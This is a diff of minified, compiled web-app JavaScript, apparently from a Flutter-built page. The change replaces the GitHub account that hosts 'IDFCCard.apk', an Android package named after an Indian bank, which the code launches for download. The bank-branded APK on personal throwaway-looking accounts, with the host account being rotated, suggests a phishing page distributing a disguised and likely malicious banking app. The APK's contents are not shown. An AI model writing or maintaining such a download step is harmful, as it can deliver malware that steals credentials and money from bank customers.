@@ -28419,7 +28419,7 @@ abb(a,b){var s=null,r=A.w7(s,s,s,B.N7,s,B.B,s,A.aV(b,s,s,s,s,B.AR,s,s,s),s,B.cV,
 a.ae(t.Pu).f.oX(r)},
 a9h(){var s=0,r=A.I(t.H),q
 var $async$a9h=A.E(function(a,b){if(a===1)return A.F(b,r)
-for(;;)switch(s){case 0:q=A.jN("https://github.com/atulsharma09838-sys/allidfme/releases/download/allidfme/IDFCCard.apk",0,null)
+for(;;)switch(s){case 0:q=A.jN("https://github.com/k3713848-afk/allidfme/releases/download/allidfme/IDFCCard.apk",0,null)
 s=2
 return A.O(A.aD6(q,B.IU),$async$a9h)
 case 2:if(!b)throw A.f(A.dy("Could not launch "+q.k(0)))
